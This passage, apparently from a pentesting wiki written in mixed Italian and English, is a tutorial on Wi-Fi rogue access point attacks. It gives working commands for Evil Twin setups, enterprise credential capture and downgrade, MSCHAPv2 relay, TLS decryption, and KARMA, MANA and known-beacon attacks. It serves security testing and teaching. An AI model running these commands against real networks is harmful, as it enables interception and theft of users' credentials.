- I broadcast probe requests hanno il campo SSID nullo e vengono inviati a tutti gli AP nelle vicinanze, permettendo alla stazione di controllare la presenza di reti preferite senza rivelare il contenuto della sua PNL.

## Simple AP with redirection to Internet

Prima di spiegare come eseguire attacchi più complessi verrà spiegato **come** semplicemente **creare** un **AP** e **reindirizzare** il suo **traffico** verso un'interfaccia connessa **a** **Internet**.

Usando `ifconfig -a` verifica che l'interfaccia wlan per creare l'AP e l'interfaccia connessa a Internet siano presenti.

### DHCP & DNS
```bash
apt-get install dnsmasq #Manages DHCP and DNS
```
Crea il file di configurazione `/etc/dnsmasq.conf`:
```ini
interface=wlan0
dhcp-authoritative
dhcp-range=192.168.1.2,192.168.1.30,255.255.255.0,12h
dhcp-option=3,192.168.1.1
dhcp-option=6,192.168.1.1
server=8.8.8.8
log-queries
log-dhcp
listen-address=127.0.0.1
```
Poi **set IPs** e **routes**:
```bash
ifconfig wlan0 up 192.168.1.1 netmask 255.255.255.0
route add -net 192.168.1.0 netmask 255.255.255.0 gw 192.168.1.1
```
E poi **avvia** dnsmasq:
```bash
dnsmasq -C dnsmasq.conf -d
```
### hostapd
```bash
apt-get install hostapd
```
Crea un file di configurazione `hostapd.conf`:
```ini
interface=wlan0
driver=nl80211
ssid=MITIWIFI
hw_mode=g
channel=11
macaddr_acl=0
ignore_broadcast_ssid=0
auth_algs=1
wpa=2
wpa_passphrase=mitmwifi123
wpa_key_mgmt=WPA-PSK
wpa_pairwise=CCMP
wpa_group_rekey=86400
ieee80211n=1
wme_enabled=1
```
**Interrompi i processi fastidiosi** , imposta **monitor mode**, e **avvia hostapd**:
```bash
airmon-ng check kill
iwconfig wlan0 mode monitor
ifconfig wlan0 up
hostapd ./hostapd.conf
```
### Inoltro e Reindirizzamento
```bash
iptables --table nat --append POSTROUTING --out-interface eth0 -j MASQUERADE
iptables --append FORWARD --in-interface wlan0 -j ACCEPT
echo 1 > /proc/sys/net/ipv4/ip_forward
```
## Evil Twin

Un attacco Evil Twin sfrutta il modo in cui i client WiFi riconoscono le reti, basandosi principalmente sul nome della rete (ESSID) senza richiedere alla base station (access point) di autenticarsi verso il client. I punti chiave includono:

- **Difficoltà nella differenziazione**: i dispositivi faticano a distinguere tra access points legittimi e rogue quando condividono lo stesso ESSID e tipo di crittografia. Le reti reali spesso usano più access points con lo stesso ESSID per estendere la copertura in modo trasparente.
- **Roaming del client e manipolazione della connessione**: il protocollo 802.11 permette ai dispositivi di spostarsi tra access points all'interno dello stesso ESS. Gli attaccanti possono sfruttare questo attirando un dispositivo a disconnettersi dalla sua base station attuale e connettersi a un rogue access point. Questo può essere ottenuto offrendo un segnale più forte o interrompendo la connessione al access point legittimo tramite metodi come deauthentication packets o jamming.
- **Sfide nell'esecuzione**: Eseguire con successo un evil twin attack in ambienti con più access points ben posizionati può essere difficile. Deauthenticating un singolo access point legittimo spesso porta il dispositivo a connettersi a un altro access point legittimo a meno che l'attaccante non possa deauthenticate tutti gli access points vicini o posizionare strategicamente il rogue access point.

Puoi creare un Open Evil Twin molto semplice (senza la capacità di instradare il traffico verso Internet) facendo:
```bash
airbase-ng -a 00:09:5B:6F:64:1E --essid "Elroy" -c 1 wlan0mon
```
Puoi anche creare un Evil Twin usando **eaphammer** (nota che per creare evil twins con eaphammer l'interface **NON dovrebbe essere** in **monitor** mode):
```bash
./eaphammer -i wlan0 --essid exampleCorp --captive-portal
```
Oppure usando Airgeddon: `Options: 5,6,7,8,9 (inside Evil Twin attack menu).`

![](<../../images/image (1088).png>)

Per favore, nota che di default se un ESSID nella PNL è salvato come protetto WPA, il dispositivo non si connetterà automaticamente a un Open evil Twin. Puoi provare a effettuare un DoS sull'AP reale e sperare che l'utente si connetta manualmente al tuo Open evil Twin, oppure puoi effettuare un DoS sull'AP reale e usare un WPA Evil Twin per catturare l'handshake (usando questo metodo non potrai permettere alla vittima di connettersi a te poiché non conosci la PSK, ma puoi catturare l'handshake e provare a crackarlo).

_Alcuni OS e AV avviseranno l'utente che connettersi a una rete Open è pericoloso..._

### WPA/WPA2 Evil Twin

Puoi creare un **Evil Twin using WPA/2** e se i dispositivi sono configurati per connettersi a quel SSID con WPA/2, tenteranno di connettersi. Comunque, per completare il **4-way-handshake** devi anche **conoscere** la **password** che il client userà. Se **non la conosci**, la **connessione non sarà completata**.
```bash
./eaphammer -i wlan0 -e exampleCorp -c 11 --creds --auth wpa-psk --wpa-passphrase "mywifipassword"
```
### Enterprise Evil Twin

Per capire questi attacchi, raccomando di leggere prima il breve [WPA Enterprise explanation](#wpa-enterprise-mgt).

**Uso di hostapd-wpe**

`hostapd-wpe` ha bisogno di un file di **configurazione** per funzionare. Per **automatizzare** la generazione di queste configurazioni puoi usare [https://github.com/WJDigby/apd_launchpad](https://github.com/WJDigby/apd_launchpad) (scarica il file python dentro _/etc/hostapd-wpe/_)
```bash
./apd_launchpad.py -t victim -s PrivateSSID -i wlan0 -cn company.com
hostapd-wpe ./victim/victim.conf -s
```
Nel file di configurazione puoi selezionare molte cose diverse come ssid, channel, user files, cret/key, dh parameters, wpa version e auth...

[**Using hostapd-wpe with EAP-TLS to allow any certificate to login.**](evil-twin-eap-tls.md)

**Usare EAPHammer**
```bash
# Generate Certificates
./eaphammer --cert-wizard

# Launch Attack
./eaphammer -i wlan0 --channel 4 --auth wpa-eap --essid CorpWifi --creds
```
Per impostazione predefinita, EAPHammer usa questi authentication methods (nota GTC come il primo da provare per ottenere plaintext passwords e poi l'uso di metodi di auth più robusti):
```
GTC,MSCHAPV2,TTLS-MSCHAPV2,TTLS,TTLS-CHAP,TTLS-PAP,TTLS-MSCHAP,MD5
```
Questa è la metodologia predefinita per evitare lunghi tempi di connessione. Tuttavia, puoi anche specificare al server gli authentication methods dal più debole al più forte:
```
--negotiate weakest
```
Oppure puoi anche usare:

- `--negotiate gtc-downgrade` per usare un'implementazione GTC downgrade altamente efficiente (password in cleartext)
- `--negotiate manual --phase-1-methods PEAP,TTLS --phase-2-methods MSCHAPV2,GTC,TTLS-PAP` per specificare manualmente i metodi offerti (offrendo gli stessi metodi di auth nello stesso ordine dell’organizzazione l'attacco sarà molto più difficile da rilevare).
- [Find more info in the wiki](http://solstice.sh/wireless/eaphammer/2019/09/10/eap-downgrade-attacks/)

#### When clients skip RADIUS certificate validation (PEAP/TTLS)

- If devices are configured with "do not validate certificate", a cloned AP + rogue RADIUS (`eaphammer --cert-wizard --creds --auth wpa-eap`) will collect **NetNTLMv2** (PEAP-MSCHAPv2) or **cleartext** creds (PEAP-GTC). `bettercap` deauth (`wifi.deauth <BSSID>`) both reveals hidden SSIDs during probes and forces reconnects, unless PMF/802.11w blocks spoofed deauth.
- Cracked NetNTLMv2 gives reusable Wi‑Fi/AD creds; GTC yields immediate plaintext.

#### Relaying PEAP-MSCHAPv2 instead of cracking (wpa_sycophant + hostapd-mana)

- For machine accounts with uncrackable random passwords, abuse **MSCHAPv2 relay**: run `hostapd-mana` as the Evil Twin, forwarding the MSCHAPv2 exchange to `wpa_sycophant`, which simultaneously connects to the legitimate AP. Successful relay grants authenticated Wi‑Fi without recovering the password.
- Use builds that support the target security level (WPA3/PMF requires recent hostapd/wpa_supplicant); PMF prevents deauth coercion, so wait for voluntary client associations.

**Using Airgeddon**

`Airgeddon` can use previously generated certificated to offer EAP authentication to WPA/WPA2-Enterprise networks. The fake network will downgrade the connection protocol to EAP-MD5 so it will be able to **capture the user and the MD5 of the password**. Later, the attacker can try to crack the password.\
`Airggedon` offers you the possibility of a **continuous Evil Twin attack (noisy)** or **only create the Evil Attack until someone connects (smooth).**

![](<../../images/image (936).png>)

### Debugging PEAP and EAP-TTLS TLS tunnels in Evil Twins attacks

_This method was tested in an PEAP connection but as I'm decrypting an arbitrary TLS tunnel this should also works with EAP-TTLS_

Inside the **configuration** of _hostapd-wpe_ **comment** the line that contains _**dh_file**_ (from `dh_file=/etc/hostapd-wpe/certs/dh` to `#dh_file=/etc/hostapd-wpe/certs/dh`)\
This will make `hostapd-wpe` to **exchange keys using RSA** instead of DH, so you will be able to **decrypt** the traffic later **knowing the servers private key**.

Now start the **Evil Twin** using **`hostapd-wpe`** with that modified configuration as usual. Also, start **`wireshark`** in the **interface** which is performing the Evil Twin attack.

Now or later (when you have already captured some authentication intents) you can add the private RSA key to wireshark in: `Edit --> Preferences --> Protocols --> TLS --> (RSA keys list) Edit...`

Add a new entry and fill the form with this values: **IP address = any** -- **Port = 0** -- **Protocol = data** -- **Key File** (**select your key file**, to avoid problems select a key file **without being password protected**).

![](<../../images/image (687).png>)

And look at the new **"Decrypted TLS" tab**:

![](<../../images/image (231).png>)

## KARMA, MANA, Loud MANA and Known beacons attack

### ESSID and MAC black/whitelists

Different types of Media Access Control Filter Lists (MFACLs) and their corresponding modes and effects on the behavior of a rogue Access Point (AP):

1. **MAC-based Whitelist**:
- The rogue AP will respond only to probe requests from devices specified in the whitelist, remaining invisible to all others not listed.
2. **MAC-based Blacklist**:
- The rogue AP will ignore probe requests from devices on the blacklist, effectively making the rogue AP invisible to those specific devices.
3. **SSID-based Whitelist**:
- The rogue AP will respond to probe requests only for specific ESSIDs listed, making it invisible to devices whose Preferred Network Lists (PNLs) do not contain those ESSIDs.
4. **SSID-based Blacklist**:
- The rogue AP will not respond to probe requests for the specific ESSIDs on the blacklist, making it invisible to devices seeking those particular networks.
```bash
# example EAPHammer MFACL file, wildcards can be used
09:6a:06:c8:36:af
37:ab:46:7a:9a:7c
c7:36:8c:b2:*:*

[--mac-whitelist /path/to/mac/whitelist/file.txt #EAPHammer whitelisting]
[--mac-blacklist /path/to/mac/blacklist/file.txt #EAPHammer blacklisting]
```

```bash
# example ESSID-based MFACL file
name1
name2
name3

[--ssid-whitelist /path/to/mac/whitelist/file.txt]
[--ssid-blacklist /path/to/mac/blacklist/file.txt]
```
### KARMA

Questo metodo permette a un attaccante di creare un access point maligno (AP) che risponde a tutte le probe requests dai dispositivi che cercano di connettersi alle reti. Questa tecnica inganna i dispositivi inducendoli a connettersi all'AP dell'attaccante mimando le reti che i dispositivi stanno cercando. Quando un dispositivo invia una connection request a questo rogue AP, la connessione viene completata, portando il dispositivo a collegarsi per errore alla rete dell'attaccante.

### MANA

Poi, i dispositivi hanno iniziato a ignorare risposte di rete non affidabili, riducendo l'efficacia dell'originale karma attack. Tuttavia è stato introdotto un nuovo metodo, conosciuto come MANA attack, da Ian de Villiers e Dominic White. Questo metodo prevede che il rogue AP catturi le Preferred Network Lists (PNL) dai dispositivi rispondendo alle loro broadcast probe requests con nomi di rete (SSIDs) precedentemente memorizzati dai dispositivi. Questo sofisticato attacco bypassa le protezioni contro l'originale karma attack sfruttando il modo in cui i dispositivi ricordano e danno priorità alle reti conosciute.

Il MANA attack opera monitorando sia directed che broadcast probe requests dai dispositivi. Per le directed requests, registra il MAC address del dispositivo e il nome della rete richiesto, aggiungendo queste informazioni a una lista. Quando viene ricevuta una broadcast request, l'AP risponde con informazioni corrispondenti a una qualsiasi delle reti nella lista del dispositivo, inducendo il dispositivo a connettersi al rogue AP.
```bash
./eaphammer -i wlan0 --cloaking full --mana --mac-whitelist whitelist.txt [--captive-portal] [--auth wpa-psk --creds]
```
### Loud MANA

Un attacco **Loud MANA** è una strategia avanzata utilizzata quando i dispositivi non effettuano probe diretti o quando le loro Preferred Network Lists (PNL) sono sconosciute all'attaccante. Opera sul principio che **i dispositivi nella stessa area probabilmente condividono alcuni nomi di rete nelle loro PNL**. Invece di rispondere selettivamente, questo attacco invia in broadcast probe responses per ogni nome di rete (ESSID) trovato nelle PNL combinate di tutti i dispositivi osservati. Questo approccio ampio aumenta la probabilità che un dispositivo riconosca una rete familiare e tenti di connettersi al rogue Access Point (AP).
```bash
./eaphammer -i wlan0 --cloaking full --mana --loud [--captive-portal] [--auth wpa-psk --creds]
```
### Known Beacon attack

Quando la **Loud MANA attack** potrebbe non essere sufficiente, la **Known Beacon attack** offre un altro approccio.  

Questo metodo **brute-forces the connection process by simulating an AP that responds to any network name, cycling through a list of potential ESSIDs** ricavate da una wordlist. Questo simula la presenza di numerose reti, nella speranza di trovare un ESSID nella PNL della vittima, inducendo un tentativo di connessione all'AP artefatto. L'attacco può essere amplificato combinandolo con l'opzione `--loud` per un tentativo più aggressivo di intrappolare dispositivi.

Eaphammer ha implementato questo attacco come un MANA attack in cui tutti gli ESSIDs all'interno di una lista vengono trasmessi (potresti anche combinare questo con `--loud` per creare un Loud MANA + Known beacons attack):
```bash
./eaphammer -i wlan0 --mana [--loud] --known-beacons  --known-ssids-file wordlist.txt [--captive-portal] [--auth wpa-psk --creds]
```
**Known Beacon Burst attack**

La **Known Beacon Burst attack** coinvolge **rapid-fire broadcasting of beacon frames for each ESSID listed in a file**. Questo crea un ambiente denso di reti false, aumentando notevolmente la probabilità che i dispositivi si connettano al rogue AP, soprattutto se combinata con una MANA attack. Questa tecnica sfrutta velocità e volume per sopraffare i meccanismi di selezione della rete dei dispositivi.
```bash
# transmit a burst of 5 forged beacon packets for each entry in list
./forge-beacons -i wlan1 \
--bssid de:ad:be:ef:13:37 \
--known-essids-file known-s.txt \
--dst-addr 11:22:33:11:22:33 \
--burst-count 5
```
## Wi-Fi Direct

**Wi-Fi Direct** è un protocollo che permette ai dispositivi di collegarsi direttamente tra loro usando il Wi‑Fi senza la necessità di un tradizionale access point wireless. Questa funzionalità è integrata in vari dispositivi Internet of Things (IoT), come stampanti e televisori, facilitando la comunicazione diretta tra dispositivi. Una caratteristica notevole di Wi‑Fi Direct è che un dispositivo assume il ruolo di access point, noto come group owner, per gestire la connessione.

La sicurezza delle connessioni Wi‑Fi Direct è stabilita tramite **Wi-Fi Protected Setup (WPS)**, che supporta diversi metodi per l'associazione sicura, inclusi:

- **Push-Button Configuration (PBC)**
- **PIN entry**
- **Near-Field Communication (NFC)**

Questi metodi, in particolare il metodo PIN entry, sono soggetti alle stesse vulnerabilità del WPS nelle reti Wi‑Fi tradizionali, rendendoli bersagli per vettori di attacco simili.

### EvilDirect Hijacking

**EvilDirect Hijacking** è un attacco specifico per Wi‑Fi Direct. Riprende il concetto di un attacco Evil Twin ma prende di mira le connessioni Wi‑Fi Direct. In questo scenario, un attaccante si spaccia per un legittimo group owner con l'obiettivo di ingannare i dispositivi inducendoli a connettersi a un'entità malevola. Questo metodo può essere eseguito usando strumenti come `airbase-ng` specificando il canale, l'ESSID e l'indirizzo MAC del dispositivo impersonato:

## References

- [https://posts.specterops.io/modern-wireless-attacks-pt-i-basic-rogue-ap-theory-evil-twin-and-karma-attacks-35a8571550ee](https://posts.specterops.io/modern-wireless-attacks-pt-i-basic-rogue-ap-theory-evil-twin-and-karma-attacks-35a8571550ee)
- [https://posts.specterops.io/modern-wireless-attacks-pt-ii-mana-and-known-beacon-attacks-97a359d385f9](https://posts.specterops.io/modern-wireless-attacks-pt-ii-mana-and-known-beacon-attacks-97a359d385f9)
- [https://posts.specterops.io/modern-wireless-tradecraft-pt-iii-management-frame-access-control-lists-mfacls-22ca7f314a38](https://posts.specterops.io/modern-wireless-tradecraft-pt-iii-management-frame-access-control-lists-mfacls-22ca7f314a38)
- [https://posts.specterops.io/modern-wireless-tradecraft-pt-iv-tradecraft-and-detection-d1a95da4bb4d](https://posts.specterops.io/modern-wireless-tradecraft-pt-iv-tradecraft-and-detection-d1a95da4bb4d)
- [https://github.com/gdssecurity/Whitepapers/blob/master/GDS%20Labs%20-%20Identifying%20Rogue%20Access%20Point%20Attacks%20Using%20Probe%20Response%20Patterns%20and%20Signal%20Strength.pdf](https://github.com/gdssecurity/Whitepapers/blob/master/GDS%20Labs%20-%20Identifying%20Rogue%20Access%20Point%20Attacks%20Using%20Probe%20Response%20Patterns%20and%20Signal%20Strength.pdf)
- [http://solstice.sh/wireless/eaphammer/2019/09/10/eap-downgrade-attacks/](http://solstice.sh/wireless/eaphammer/2019/09/10/eap-downgrade-attacks/)
- [https://www.evilsocket.net/2019/02/13/Pwning-WiFi-networks-with-bettercap-and-the-PMKID-client-less-attack/](https://www.evilsocket.net/2019/02/13/Pwning-WiFi-networks-with-bettercap-and-the-PMKID-client-less-attack/)
- [https://medium.com/hacking-info-sec/ataque-clientless-a-wpa-wpa2-usando-pmkid-1147d72f464d](https://medium.com/hacking-info-sec/ataque-clientless-a-wpa-wpa2-usando-pmkid-1147d72f464d)
- [https://forums.kali.org/showthread.php?24286-WPS-Pixie-Dust-Attack-(Offline-WPS-Attack)](<https://forums.kali.org/showthread.php?24286-WPS-Pixie-Dust-Attack-(Offline-WPS-Attack)>)
- [https://www.evilsocket.net/2019/02/13/Pwning-WiFi-networks-with-bettercap-and-the-PMKID-client-less-attack/](https://www.evilsocket.net/2019/02/13/Pwning-WiFi-networks-with-bettercap-and-the-PMKID-client-less-attack/)
- [The vulnerability that killed FreeWifi_Secure](https://7h30th3r0n3.fr/the-vulnerability-that-killed-freewifi_secure/)
- [RFC 4186 – EAP-SIM Authentication](https://datatracker.ietf.org/doc/html/rfc4186)
- [3GPP TS 33.402 – 3GPP system architecture evolution (SAE); Security aspects of non-3GPP accesses](https://www.3gpp.org/ftp/Specs/archive/33_series/33.402/)
- [Wireless-(in)Fidelity: Pentesting Wi-Fi in 2025 (Synacktiv)](https://www.synacktiv.com/en/publications/wireless-infidelity-pentesting-wi-fi-in-2025.html)
- [PEAP relay attacks with wpa_sycophant (SensePost)](https://sensepost.com/blog/2019/peap-relay-attacks-with-wpa_sycophant/)


TODO: Take a look to [https://github.com/wifiphisher/wifiphisher](https://github.com/wifiphisher/wifiphisher) (login con Facebook e imitazione di WPA in captive portals)

{{#include ../../banners/hacktricks-training.md}}
